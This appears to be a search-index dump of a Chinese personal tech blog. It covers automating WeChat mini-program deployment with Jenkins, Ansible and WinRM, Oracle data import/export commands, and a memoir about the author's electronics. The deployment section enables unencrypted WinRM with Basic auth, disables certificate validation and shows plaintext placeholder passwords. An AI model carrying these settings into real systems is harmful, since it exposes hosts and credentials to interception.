","date":"2021-03-13","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/:2:4","series":null,"tags":["blog","树莓派"],"title":"树莓派初始化","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%A0%91%E8%8E%93%E6%B4%BE%E5%88%9D%E5%A7%8B%E5%8C%96/#wifi-配置"},{"categories":["blog"],"content":"公司先阶段使用的是通过ansible来进行多服务器的部署。而微信小程序开发者工具官方只放出来了windows和mac版本。macOS老早就听说虚拟机需要超高的配置，而且也会很卡。自己也没有操作过，对mac的虚拟机没什么兴趣。估计以后也用不大上。否则也不会有那么多人去用黑苹果了。所以就开始了这次在windows机器上的踩坑之旅","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/"},{"categories":["blog"],"content":" 简介公司先阶段使用的是通过 ansible 来进行多服务器的部署。而微信小程序开发者工具官方只放出来了 windows 和 mac 版本。 MacOS 老早就听说虚拟机需要超高的配置，而且也会很卡。自己也没有操作过，对 mac 的虚拟机没什么兴趣。估计以后也用不大上。否则也不会有那么多人去用黑苹果了。 所以就开始了这次在 windows 机器上的踩坑之旅。 ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:1:0","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#简介"},{"categories":["blog"],"content":" 基本环境介绍本次操作是在 win 10 上进行的。 远程操作使用的 jenkins 是 Ubuntu 系统。 ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:2:0","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#基本环境介绍"},{"categories":["blog"],"content":" 远程操控端 Ubuntu 环境搭建默认 linux 都是有 python 环境的。但是不一定有 pip。这是 python 的一个包管理工具。很多需要用到的工具包，都需要用 pip 来进行安装。 操作步骤 在 Ubuntu 中，可以使用 apt install python-pip 命令安装。 输入 pip 命令，确认安装完成。 Pip install pywinrm ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:2:1","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#远程操控端-ubuntu-环境搭建"},{"categories":["blog"],"content":" Win 10 被控端环境搭建由于 windows 和 mac/linux 不一样，没有 ssh 远程连接。所以 ansible 是通过 pywinrm 模块，进行操作的。 系统要求 Net 要 3.0 以上。在 powershell 输入 $host 获取 net 版本。 Powershell 也要 3.0 以上。在 powershell 输入 $psversiontable 获得 ps 版本。 系统推荐使用 win 10。 操作步骤 Set-executionpolicy remotesigned (可以用 get-executionpolicy 验证) 下载并使用管理员 powershell 运行 此配置脚本 Winrm quickconfig 快速配置启用 Winrm set winrm/config/service ‘@{AllowUnencrypted=“true”}’ Winrm set winrm/config/service/auth ‘@{Basic=“true”}’ ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:2:2","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#win-10-被控端环境搭建"},{"categories":["blog"],"content":" 在 ansible 脚本内配置变量 [windows] 1.1.1.1 [windows:vars] ansible_ssh_user=username ansible_ssh_pass=password ansible_ssh_port=5985 ansible_winrm_transport=ntlm ansible_connection=winrm ansible_winrm_server_cert_validation=ignore ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:2:3","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#在-ansible-脚本内配置变量"},{"categories":["blog"],"content":" 具体流程由于很多东西不方便直接贴代码，所以这里列出大概的流程 Jenkins 拉下代码以后，开始执行 ansible 脚本。(在 jenkins 内部把用户名和密码等变量写好，通过 –extra-vars 方式传递) 通过 win_file 模块创建文件夹，win_copy 模块拷贝代码到 windows 机器上。 - name: 拷贝最新代码到win目录 win_copy: src: \"/local_workspace_path/\" dest: D:\\wechat_workspace\\{{ build_number }} 用 win_command 来安装依赖。构建代码同理。 - name: 在win上安装依赖 win_command: cmd.exe /c npm i args: chdir: D:\\wechat_workspace\\{{ build_number }} 开始部署 - name: 尝试开始部署 win_command: cmd.exe /c mini-deploy args: chdir: D:\\wechat_workspace\\{{ build_number }}\\dist 把预览图拷贝到本地 - name: 把生成的预览图片拷贝到本地 fetch: src: D:\\wechat_workspace\\{{ build_number }}\\dist\\preview.png dest: \"/local_workspace_path/preview.png\" flat: yes 通过 base 64 获取图片 encode 编码，md 5 sum 获取图片的 md 5 值。通过 curl 发送到企业机器人，群内就可以通过扫码进行代码代码测试了。 ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:3:0","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#具体流程"},{"categories":["blog"],"content":" 问题处理","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:4:0","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#问题处理"},{"categories":["blog"],"content":" Npm i 的安装问题Npm 在 install 过程过，有需要调用 node 命令。因为存在微信 node 和本身环境的 node，会出现问题，需要通过如下指令进行配置！ npm config set scripts-prepend-node-path true ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:4:1","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#npm-i-的安装问题"},{"categories":["blog"],"content":" Mini-deploy 的问题Mini-deploy 代码中默认设置查找路径为 wxPaths = ['C:\\\\Program Files (x86)\\\\Tencent\\\\微信web开发者工具\\\\cli.bat', 'C:\\\\Program Files\\\\Tencent\\\\微信web开发者工具\\\\cli.bat'] 然后去注册表 REG QUERY \"HKLM\\\\SOFTWARE\\\\Wow6432Node\\\\Tencent\\\\微信web开发者工具 查询真正的安装位置，放在数组的第一位作为启动项。 由于微信开发工具默认安装到 c 盘，路径中包含有空格，在 ansible 的执行过程中，会出现报错。 于是改动到了 D 盘。于是路径出现了问题。 最终在 wxPaths 中新增了一个路径，顺利完成。 ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:4:2","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#mini-deploy-的问题"},{"categories":["blog"],"content":" 无法删除 dist，最终代码文件夹长期开启小程序工具，每一次的代码都存放到不同的文件夹。只能以后再去删除了。 ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:4:3","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#无法删除-dist最终代码文件夹"},{"categories":["blog"],"content":" 微信机器人 base 64 的问题由于 base 64 数据量大，发送的请求数据不可读。所以这个问题折腾了我差不多 3 个小时。 Base 64 命令默认会有一个 w 参数为 76，导致换行。上传后的 base 64 数据就会与 md 5 校验码不同。 需要添加参数，具体命令为 base -w 0 preview.png ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:4:4","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#微信机器人-base-64-的问题"},{"categories":["blog"],"content":" 补充说明 推荐先了解 scoop，类似于 centos 的 yum、Ubuntu 的 apt 命令。可以很方便的安装和卸载所需的工具。例如 wget、git、python、nodejs、java 等常用命令。 所有 win_command 需要使用 cmd.exe /c dir 这样的方法调用，可以避免很多问题。 Shell 代码内，一对双引号，里面包一对单引号。在单引号内就可以通过 $ 符号使用变量。 Ansible 的 fetch 可以用来同步回本地单个文件。无论是 linux 或 windows ","date":"2020-02-25","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/:5:0","series":null,"tags":["blog","devops","部署"],"title":"微信小程序自动化部署","uri":"/posts/%E7%AC%94%E8%AE%B0/%E5%BE%AE%E4%BF%A1%E5%B0%8F%E7%A8%8B%E5%BA%8F%E8%87%AA%E5%8A%A8%E5%8C%96%E9%83%A8%E7%BD%B2/#补充说明"},{"categories":["blog"],"content":"虽然现在的互联网公司都流行mysql这样的免费数据库。但是在各行各业oracle还是非常主流的选择。无论是否有授权，很多的数据迁移都是在oracle之间进行的。所以这篇文章用来迁移一下自己的笔记，并进行梳理","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/"},{"categories":["blog"],"content":" 简介虽然现在的互联网公司都流行 mysql 这样的免费数据库。但是在各行各业 oracle 还是非常主流的选择。无论是否有授权，很多的数据迁移都是在 oracle 之间进行的。 所以这篇文章用来迁移一下自己的笔记，并进行梳理。 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:1:0","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#简介"},{"categories":["blog"],"content":" 开篇说明我喜欢东西精简而不出错。所以尽量不给自己找麻烦。 所以很多的命令参数，但是我都没有用上。主要是因为在我的使用过程中，没有解决多余的问题，或者说没有提升体验。 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:2:0","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#开篇说明"},{"categories":["blog"],"content":" plsql_developplsql 是一个收费软件。但是国内你懂的，非常多的破解和绿色版。在我遇到的公司中，都是统一使用的工具。 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:3:0","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#plsql_develop"},{"categories":["blog"],"content":" 特点 适用于数据量不大的操作。非常简便。如果只是几千条数据，甚至我经常复制粘贴来处理日常工作。 有自己的 pde 格式。可以导出导入 tables 数据。 同时支持文本导入器。例如打开一个 csv 文件。然后通过字段映射，导入 oracle。 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:3:1","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#特点"},{"categories":["blog"],"content":" exp 和 imp一个历史悠长的工具。但是操作简单，oracle 自带。 在我交接数据的过程中，生成 dmp 结尾文件几乎是统一标准。 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:4:0","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#exp-和-imp"},{"categories":["blog"],"content":" 特点 适合统一的 oracle 的环境操作。 你需要关注字符集问题 (源数据库字符集、导出端字符集、导入端字符集、目标数据库字符集)。 高版本兼容低版本，但是反之则不然！ ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:4:1","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#特点-1"},{"categories":["blog"],"content":" exp 表模式 # 导出数据。不导出索引。指定导出表名 exp user/pawd rows=y indexes=n file=path/exp.dmp log=exp.log tables=tab1,tab2,tab3 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:4:2","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#exp-表模式"},{"categories":["blog"],"content":" exp 用户模式 # 指定导出用户 exp user/pawd owner=user rows=y indexes=n file=exp.dmp log=exp.log ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:4:3","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#exp-用户模式"},{"categories":["blog"],"content":" exp 完全模式 # 需要用高权限用户，然后导出全库。用到的极少。 exp user/pawd rows=y indexes=n full=y file=exp.dmp log=exp.log ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:4:4","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#exp-完全模式"},{"categories":["blog"],"content":" imp 导入方法 # 指定以前的用户名，导入到现在的用户名。不导入索引 # 可以指定导入的表名 # ignore=n 可以忽略创建错误，直接追加数据 # commit=y 可以定量提交。否则会占用大量的回滚空间后一次性提交 # 不加表名默认导入所有。适合用户模式。如果再加上full=y，那么就是全库导入了 imp user/pawd fromuser=user touser=pawd rows=y indexes=n commit=y file=exp.dmp log=imp.log tables=t1,t2,t3 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:4:5","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#imp-导入方法"},{"categories":["blog"],"content":" expdp 和 impdp这是一个比较新的 oracle 自带工具。更加强大易用。 但是运维方面你懂的，很多都是老油条了。所以主要用来自己处理工作中的问题。 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:5:0","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#expdp-和-impdp"},{"categories":["blog"],"content":" 特点 性能好，速度快 可以远程通过网络导入导出！ 提供参数跨 oracle 版本导入导出 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:5:1","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#特点-2"},{"categories":["blog"],"content":" 前提条件expdp 和 impdp 都需要在数据库中指定目录。oracle 自带也有目录给你用，但是我推荐自己放一个容易找的地方。 create directory dump_path_name as '/path/backup'; 如果你不是在 oracle 服务器上操作，则需要在本地 oracle 建立 dblink。然后通过参数 network_link 参数进行操作。 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:5:2","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#前提条件"},{"categories":["blog"],"content":" expdp 使用方法 expdp system/123456 # 指定用户接收数据 schemas=xiangxi directory=EXPDP_DIR # 不需要统计信息，源数据库的统计信息可能会让目标数据库的查询策略改变，可能影响性能。 # 还可以加上indexes等等，加快导出速度。 exclude=STATISTICS # 并行导出，速度翻倍！ parallel=4 # %U可以让文件自动从01,02...来命名，主要用来配合上面的并行参数。 dumpfile=xiangxi20160726_%U.dmp logfile=xiangxi20160726.log # 可以过滤指定目标表的数据 query='xiangxi.T_SYS_LOGS:\"WHERE 1=2\"' # 指定按照什么版本的dmp格式导出 version=11.2.0.1.0 # 用来处理用户名不一致 remap_schema=old_schema:new_schema # 用来处理表空间不一致 remap_tablespace=old_tablespace:new_tablespace # 表如果存在，就跳过。还可以truncate清空表。APPEND追加。REPLACE替换。 TABLE_EXISTS_ACTION=SKIP # network_link=dblink_name用来远程导出。 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:5:3","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#expdp-使用方法"},{"categories":["blog"],"content":" impdp 使用方法 # 可以看到几乎相同。都是根据对应的expdp导出方法来进行参数设定 impdp xiangxi2/123456 directory=EXPDP_DIR dumpfile=xiangxi20160726_01.dmp,xiangxi20160726_02.dmp,xiangxi20160726_03.dmp,xiangxi20160726_04.dmp remap_schema=old_schema:new_schema version=11.2.0.1.0 parallel=4 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:5:4","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#impdp-使用方法"},{"categories":["blog"],"content":" 如何中止 expdp查看任务状态 select job_name,state from dba_datapump_jobs; 连接进去，看以查看状态 expdp \\\"sys/oracle as sysdba\\\" attach=SYS_EXPORT_SCHEMA_02 停止任务 stop_job=immediate 干掉人物 kill_job ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:5:5","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#如何中止-expdp"},{"categories":["blog"],"content":" 总结其实只是一次笔记的搬迁整理。不过也正好巩固了一下知识。 后续可能还会追加信息，不过数据的交接已经足够使用了。 ","date":"2020-01-05","objectID":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/:6:0","series":null,"tags":["blog","oracle"],"title":"oracle-数据导入导出","uri":"/posts/%E7%AC%94%E8%AE%B0/oracle-%E6%95%B0%E6%8D%AE%E5%AF%BC%E5%85%A5%E5%AF%BC%E5%87%BA/#总结"},{"categories":["blog"],"content":"我对电子产品或者说科技产品真的是有极大的热忱，所以打算写下来看法以及推荐","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/"},{"categories":["blog"],"content":" 简介lines 我对电子产品或者说科技产品真的是有极大的热忱，所以打算写下来看法以及推荐。 ","date":"2019-12-09","objectID":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/:1:0","series":null,"tags":["blog","lines"],"title":"我的个人电子产品路线","uri":"/posts/%E7%AC%94%E8%AE%B0/%E6%88%91%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%94%B5%E5%AD%90%E4%BA%A7%E5%93%81%E8%B7%AF%E7%BA%BF/#简介"},{"categories":["blog"],"content":" 快乐时光 小霸王 我的第一件个人电子产品，应该是小霸王学习机吧。就是成龙打过广告的那个。 我说是可以用来打字，提升自己的打字速度。于是我的外公买给了我。要不是写这篇博客，我可能都不会记得这件事情。当时是在衡东老汽车站的十字路口，那个店子卖磁带，光盘，以及各种电子产品，我觉得特别新奇。 当时我几乎没怎么摸过键盘。买回来以后，发现这些打字游戏真的是太难了，开始了和院子里的小伙伴们玩耍之路。。我觉得那是那个年代里最有性价比的东西了。。 因为街机厅里的游戏我只会打飞机游戏 - 雷电，还要买币。。 杂牌手机 在我读书的时候。用过好几款手机。都是因为在读书时候开始贪玩，不爱学习。喜欢和女同学聊天。。然后用自己从爸妈那拿来的零花钱买了好几次手机 - 小灵通。 100-200 元，可以 wap 上网。当时很流行 qq 空间的抢车位和偷菜游戏，我玩得不亦乐乎。可以说这一点钱，让我的学生生活丰富了好多倍。我的手机随时可能收到的消息，立马会改变我的想法，或者接下来的几个小时。 oppo A113 读书的时候，用的最后一款手机。也是干坏事拿家里钱买的。当时的手机可以后台挂 qq，加上 oppo 主打音乐手机。外观也硬朗，于是就买了。当时也算是最拉风的手机之一了吧。 诺基亚6730c 我在一次短暂的打工旅途中。买过 2 台手机。这台设备的使用寿命是短暂的。。我是因为想和一个女同学买同样的手机，入手的。结果第二天就被偷了。很可惜。很怀念。 诺基亚5800XM 因为丢掉了 6730c，于是买了这个手机。这是我打工回家的最后一个月工资买的。到家的时候，只有 30 块了。 这也是我第一次用触屏手机。感觉非常棒。算是第一代真正意义上的智能机了。当时也还有更厉害的型号，但是我觉得很前卫。 mp3~mp4 我在一次听过我表哥的 mp3(U 盘形状，128MB) 以后。怼着我爸去买。然后到了柜台，发现了一个带 2.4 显示屏的 mp3。为什么不是 mp4 呢？因为他只支持 wmv 格式。而当时 mp4 和 rmvb 格式已经流行开来了。而我转换为 wmv 格式后还需要 90 度调整方向，否则不能全屏播放，因为屏幕太小了，根本啥都看不到。同时 256MB 的存储，限制了我只能看看 mv，电影就别想了。而我当时并不知道，只觉得别人的吊~ 本来是我妈带我去永意买，结果我爸爸怕我妈会惯着我，一定要他带我去。结果买回来一个贵的。我爸反而被骂了一顿。。哈哈哈。 我记得我在回来的路上，带上了耳机。在马路中央，我像是听到了天空远处的音乐，那感觉太神了。肯定是我的脑放加成，因为现在来看就是电子垃圾。也因为没看车，被我爸买了一通。 后面我在读书的时候，自己用零花钱买了一个橡皮擦大小的 mp3，但是有黑白显示屏和黄光灯。可以显示 3 排文字，我用它一边听歌，一边看完了饶雪漫和郭敬明的小说。结果当然是被发现了，老师没收后我就再也没见过它。 家人的手机 我在小学的时候，我爸外出去了福建打工。给我带了礼物 - 可充电电池。当时我非常爱玩具四驱车，强大的电量让我的车比别人跑的快多了。而他带回来了一部非常小巧神奇的手机 -诺基亚8210。 它可以更换前后盖、电池。我爸买了 3 个左右的外壳。一两个月就换一次。就像是换了新手机。同时手机非常小巧，简洁。质量也是无敌的存在。记得那时候，电视上好多人物都用这个手机呢。并且不像现在手机都给了赞助。当时大家是真的觉得诺基亚好。 后来慢慢有了彩屏手机。我爸也换了一个 诺基亚3230。 